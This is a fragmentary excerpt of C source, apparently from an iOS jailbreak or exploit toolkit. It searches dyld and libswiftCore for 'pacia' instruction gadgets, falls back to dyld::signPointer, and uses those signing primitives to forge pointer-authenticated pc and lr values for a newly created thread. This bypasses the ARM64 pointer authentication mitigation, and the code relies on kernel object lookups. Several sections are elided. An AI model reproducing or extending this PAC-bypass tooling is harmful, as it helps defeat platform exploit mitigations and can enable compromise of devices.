...
extern bool gIsPACSupported; // defined in kcompat.m as gLaraIsPACSupported; bridged via kcompat.h #define

// dyld::signPointer fallback (LightSaber-inspired)
// Used when PACIA gadget hunting fails
static uint64_t g_dyldSignPointer = 0;

// Search for dyld::signPointer function
// LightSaber uses this as primary PAC signing method
static uint64_t find_dyld_signpointer(void)
{
    printf("[%s:%d] Searching for dyld::signPointer...\n", __FUNCTION__, __LINE__);

    void *dyldHandle = dlopen("/usr/lib/dyld", RTLD_NOW);
    if (!dyldHandle) {
        printf("[%s:%d] Failed to dlopen dyld: %s\n", __FUNCTION__, __LINE__, dlerror());
        return 0;
    }

    // Mangled name: __ZN4dyld11signPointerEPvmm (C++ name mangling)
    void *signPtr = dlsym(dyldHandle, "__ZN4dyld11signPointerEPvmm");
    if (!signPtr) {
        // Try alternative mangled names
        signPtr = dlsym(dyldHandle, "_dyld_signPointer");
    }
    if (!signPtr) {
        // Try searching for pattern near known dyld functions
        void *dyldStart = dlsym(dyldHandle, "dyldVersionNumber");
        if (dyldStart) {
            uint64_t base = native_strip((uint64_t)dyldStart);
            // Search within 0x5000 bytes for pacia x0, x1 (0xDAC10210)
            uint8_t *searchBase = (uint8_t *)(uintptr_t)base;
            for (size_t offset = 0; offset < 0x5000; offset += 4) {
                uint32_t instr = *(uint32_t *)(searchBase + offset);
                if (instr == 0xDAC10210) {  // pacia x0, x1
                    printf("[%s:%d] Found pacia x0,x1 @ offset 0x%zx from dyldVersionNumber\n",
                           __FUNCTION__, __LINE__, offset);
                    signPtr = (void *)(base + offset);
                    break;
                }
            }
        }
    ...
    if (signPtr) {
        uint64_t addr = native_strip((uint64_t)signPtr);
        printf("[%s:%d] Found dyld::signPointer @ 0x%llx\n", __FUNCTION__, __LINE__, addr);
        dlclose(dyldHandle);
        return addr;
    }

    printf("[%s:%d] dyld::signPointer not found\n", __FUNCTION__, __LINE__);
    dlclose(dyldHandle);
    return 0;
}
...
{
    /* Gadget: pacia x16, x17 / mov x0, x16 / ret
     * Found in libswiftCore.dylib near $sSwySWSnySiGciM */
    ...
    for (size_t offset = 0; offset + sizeof(paciaGadgetOpcodes) <= 0x1000; offset += 4) {
        if (memcmp(searchBase + offset, paciaGadgetOpcodes, sizeof(paciaGadgetOpcodes)) == 0) {
            printf("[%s:%d] found pacia gadget @ 0x%llx\n",
...
uint64_t remote_pac(uint64_t remoteThreadAddr, uint64_t address, uint64_t modifier)
{
    ...
    if (!g_RC_gadgetPacia) {
        ...
        if (gadgetAddr == 0) {
            // LightSaber-inspired fallback: try dyld::signPointer
            printf("[%s:%d] PACIA gadget not found, trying dyld::signPointer fallback...\n",
                   __FUNCTION__, __LINE__);
            if (!g_dyldSignPointer) {
                g_dyldSignPointer = find_dyld_signpointer();
            }
            if (!g_dyldSignPointer) {
                printf("[%s:%d] All PAC signing methods failed (gadget + dyld::signPointer)\n",
                       __FUNCTION__, __LINE__);
                return (uint64_t)-1;
            }
            g_RC_gadgetPacia = g_dyldSignPointer;
            printf("[%s:%d] Using dyld::signPointer as PACIA fallback @ 0x%llx\n",
                   __FUNCTION__, __LINE__, g_RC_gadgetPacia);
        } else {
    ...
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_create failed: %s (0x%x)\n",
    ...
    state.__sp   = sp;
    // Use _special variant: builtin ptrauth_string_discriminator compiles to 0 on arm64
    state.__pc   = pacia(g_RC_gadgetPacia, ptrauth_string_discriminator_special("pc"));
    state.__lr   = pacia(0x401, ptrauth_string_discriminator_special("lr"));
    ...
    kr = thread_set_exception_ports(pacThread,
                                    ...
                                    ARM_THREAD_STATE64);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_set_exception_ports failed: %s\n",
               __FUNCTION__, __LINE__, mach_error_string(kr));
        pac_cleanup(pacThread, exceptionPort, stack);
        return 0;
    }

    uint64_t pacThreadAddr = task_get_ipc_port_kobject(task_self_kptr(), pacThread);
    if (!pacThreadAddr) {
    ...
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_resume failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(kr));
        pac_cleanup(pacThread, exceptionPort, stack);
        return 0;
    }
